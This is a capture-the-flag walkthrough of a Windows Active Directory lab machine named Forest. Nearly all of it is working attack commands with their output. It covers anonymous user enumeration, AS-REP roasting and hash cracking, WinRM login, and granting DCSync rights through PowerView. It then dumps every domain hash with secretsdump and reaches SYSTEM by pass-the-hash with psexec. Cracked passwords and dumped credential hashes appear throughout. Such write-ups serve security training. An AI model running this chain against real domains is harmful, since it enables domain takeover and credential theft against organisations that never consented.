### IP
`10.10.10.161`

# Reconnaissance

### nmap

`nmap -sC -sV 10.10.10.161`
```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-04 19:55:08Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-06-04T19:57:27
|_  start_date: 2023-06-04T19:53:19
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-06-04T12:57:30-07:00

```

Based on LDAP, Kerberos, DNS, this is a Windows Active Directory machine.

Netbios gives us the FQDN as `FOREST.htb.local`, so we can add that to our `/etc/hosts`

### crackmapexec smb

`cme smb 10.10.10.161 -u '' -p ''  --groups --local-groups --loggedon-users --sessions --users --shares --pass-pol
`
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] htb.local\: STATUS_ACCESS_DENIED 
SMB         10.10.10.161    445    FOREST           [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         10.10.10.161    445    FOREST           [-] Error enumerating logged on users: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         10.10.10.161    445    FOREST           [-] Error enumerating domain users using dc ip 10.10.10.161: NTLM needs domain\username and a password
SMB         10.10.10.161    445    FOREST           [*] Trying with SAMRPC protocol
SMB         10.10.10.161    445    FOREST           [+] Enumerated domain user(s)
SMB         10.10.10.161    445    FOREST           htb.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.10.161    445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.161    445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
SMB         10.10.10.161    445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
SMB         10.10.10.161    445    FOREST           htb.local\$331000-VK4ADACQNUCA           
SMB         10.10.10.161    445    FOREST           htb.local\SM_2c8eef0a09b545acb           
SMB         10.10.10.161    445    FOREST           htb.local\SM_ca8c2ed5bdab4dc9b           
SMB         10.10.10.161    445    FOREST           htb.local\SM_75a538d3025e4db9a           
SMB         10.10.10.161    445    FOREST           htb.local\SM_681f53d4942840e18           
SMB         10.10.10.161    445    FOREST           htb.local\SM_1b41c9286325456bb           
SMB         10.10.10.161    445    FOREST           htb.local\SM_9b69f1b9d2cc45549           
SMB         10.10.10.161    445    FOREST           htb.local\SM_7c96b981967141ebb           
SMB         10.10.10.161    445    FOREST           htb.local\SM_c75ee099d0a64c91b           
SMB         10.10.10.161    445    FOREST           htb.local\SM_1ffab36a2f5f479cb           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc3d7722           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfc9daad           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc0a90c9           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox670628e           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox968e74d           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox6ded678           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox83d6781           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfd87238           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxb01ac64           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox7108a4e           
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox0659cc1           
SMB         10.10.10.161    445    FOREST           htb.local\sebastien                      
SMB         10.10.10.161    445    FOREST           htb.local\lucinda                        
SMB         10.10.10.161    445    FOREST           htb.local\svc-alfresco                   
SMB         10.10.10.161    445    FOREST           htb.local\andy                           
SMB         10.10.10.161    445    FOREST           htb.local\mark                           
SMB         10.10.10.161    445    FOREST           htb.local\santi                          
SMB         10.10.10.161    445    FOREST           [-] Error enumerating domain group using dc ip 10.10.10.161: NTLM needs domain\username and a password
SMB         10.10.10.161    445    FOREST           [-] Error enumerating local groups of 10.10.10.161: NTLM needs domain\username and a password
SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
SMB         10.10.10.161    445    FOREST           Minimum password length: 7
SMB         10.10.10.161    445    FOREST           Password history length: 24
SMB         10.10.10.161    445    FOREST           Maximum password age: Not Set
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
SMB         10.10.10.161    445    FOREST           	Domain Refuse Password Change: 0
SMB         10.10.10.161    445    FOREST           	Domain Password Store Cleartext: 0
SMB         10.10.10.161    445    FOREST           	Domain Password Lockout Admins: 0
SMB         10.10.10.161    445    FOREST           	Domain Password No Clear Change: 0
SMB         10.10.10.161    445    FOREST           	Domain Password No Anon Change: 0
SMB         10.10.10.161    445    FOREST           	Domain Password Complex: 0
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Minimum password age: 1 day 4 minutes 
SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set
```

We get some useful information including a list of users:

```
htb.local\Administrator
htb.local\Guest
htb.local\krbtgt
htb.local\DefaultAccount
htb.local\$331000-VK4ADACQNUCA
htb.local\SM_2c8eef0a09b545acb
htb.local\SM_ca8c2ed5bdab4dc9b
htb.local\SM_75a538d3025e4db9a
htb.local\SM_681f53d4942840e18
htb.local\SM_1b41c9286325456bb
htb.local\SM_9b69f1b9d2cc45549
htb.local\SM_7c96b981967141ebb
htb.local\SM_c75ee099d0a64c91b
htb.local\SM_1ffab36a2f5f479cb
htb.local\HealthMailboxc3d7722
htb.local\HealthMailboxfc9daad
htb.local\HealthMailboxc0a90c9
htb.local\HealthMailbox670628e
htb.local\HealthMailbox968e74d
htb.local\HealthMailbox6ded678
htb.local\HealthMailbox83d6781
htb.local\HealthMailboxfd87238
htb.local\HealthMailboxb01ac64
htb.local\HealthMailbox7108a4e
htb.local\HealthMailbox0659cc1
htb.local\sebastien
htb.local\lucinda
htb.local\svc-alfresco
htb.local\andy
htb.local\mark
htb.local\santi
```

# Exploitation

### kerbrute

Since we have a list of users, we can try using kerbrute:

I put the users in a file called `users.list`

`kerbrute -d htb.local --dc=forest.htb.local userenum users.list`

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 06/04/23 - Ronnie Flathers @ropnop

2023/06/04 15:32:31 >  Using KDC(s):
2023/06/04 15:32:31 >  	forest.htb.local:88

2023/06/04 15:32:31 >  [+] VALID USERNAME:	 Administrator@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailbox968e74d@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailboxfc9daad@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailboxc0a90c9@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailbox6ded678@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailboxc3d7722@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailbox670628e@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailbox83d6781@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailboxb01ac64@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailboxfd87238@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 sebastien@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 mark@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailbox0659cc1@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 lucinda@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 andy@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 HealthMailbox7108a4e@htb.local
2023/06/04 15:32:31 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:d95f1abe0aa704042d02419b11a926dc$b636b320fd49d950e03dc5cff8738f9b50b1b8824b712620d7b33657000f4cc44dfd18f6035e017e6330aeb18f0e8a7582d7c575aaa22c997097a4ca9f0303b2053326ae5bc5f5c4af0b41a5eb4b3ebff2b48d6e30666837e334a174955f60fa1b78e5fbd1fef4e8630b1df8d154a55fcc3a5c7de0bce32ee9e16ca52420dfd05e7d052a1258baa9c6eea092935a9bec119e648c2a521b55bc2753e5f70a3b5b33a1fe182882e6d87608993cb496cb800ab45b1be7ef1ec29a89e1f8b7e955505543c9de6a314df87a0dd5aba34fcf2182440093fb9778377df712685b4fa557dc0ca70fe81d6e8c506f7a9b9990c15bf486427cea8a2bbac9c5
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 svc-alfresco@htb.local
2023/06/04 15:32:31 >  [+] VALID USERNAME:	 santi@htb.local
2023/06/04 15:32:31 >  Done! Tested 31 usernames (18 valid) in 0.255 seconds
```

All the usernames are valid and we get a hash for the `svc-alfresco` user


### hashcat

I tried cracking the hash with hashcat:
`hashcat svc.hash /usr/share/wordlists/rockyou.txt`

Strangely, hashcat misidentifies the hash as one with etype 23, while the hash clearly has an etype of 18.
	etype 23 is RC4, while 18 is AES

To fix this, I re-ran kerbrute with the `--downgrade` flag and got a new hash with etype 23

Now, running hashcat gives us the the password: `s3rvice`


### evil-winrm

We can log in using the credentials we got through winrm:

`evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'`


We find a user flag in `C:\Users\svc-alfresco\Desktop\user.txt`

# Privilege Escalation


### BloodHound

We can upload and run `SharpHound.exe -c all` to grab data for BloodHound

Once uploaded, we can mark the `svc-alfresco` user as owned and look at the shortest path to DA from owned principals

The service user is a member of the `Account Operators` group, which has `GenericAll` permissions over the `Exchange Windows Permissions group`

We can add a new user with `net user adam password /add /domain`

According to the abuse information on BloodHound, we can add this user to the appropriate group with:

`net group "Exchange Windows Permissions" /add adam`

The exploit continues as follows:

```powershell
$pass = ConvertTo-SecureString 'password' -AsPlaintext -Force

$cred = New-Object System.Management.Automation.PSCredential('htb\adam', $pass)

Import-Module .\PowerView.ps1
Add-DomainObjectAcl -Credential $cred -TargetIdentity forest.htb.local -Rights DCSync
```

Note that the last command was something I found online, as the recommendation that BloodHound made would hang and crash my shell.


Here, we add `DCSync` permissions so we can simulate the DC to grab passwords


### secretsdump

Now that the `adam` user has `DCSync` permissions, we can run the following command from impacket to dump secrets:

`secretsdump.py -dc-ip 10.10.10.161 'htb.local/adam:password@10.10.10.161'`
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
adam:9603:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:5fc1a82b62a44b7d91c97b12c34e7eaf:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
adam$:9602:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
adam:aes256-cts-hmac-sha1-96:e15a00a31785e8146a194a92e68501dfa9e3ef4e7b117896e17b3f31c3a42486
adam:aes128-cts-hmac-sha1-96:d38adfbb41686acad59b53d9a7fca896
adam:des-cbc-md5:fe8345cb1fbcce0d
FOREST$:aes256-cts-hmac-sha1-96:3bae7bd31ede379d8fb4b97ee4ba06f4217d0b1b5ca46cc904244212eda0fb76
FOREST$:aes128-cts-hmac-sha1-96:ccda137e60efefab98c1f3aefe5d2371
FOREST$:des-cbc-md5:8c5b340446975891
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
adam$:aes256-cts-hmac-sha1-96:7d818b053f53fc63cbddf964d75a91221bb8fef1d112cf85ede50f290efcc74e
adam$:aes128-cts-hmac-sha1-96:d322d52a4bc3d3b75df3a38a1cbfd476
adam$:des-cbc-md5:499b1ff4ced3b01c
[*] Cleaning up... 
```

We now have the hashes for the users on the account

### psexec

I initially wanted to use `pth-winexe` for this, but had some trouble.

Instead, we can use the admin hash (`aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`) to log in with impacket's psexec:

`psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161 cmd`

We get a shell as `nt authority\system` and can find a root flag in `C:\Users\Administrator\root.txt`
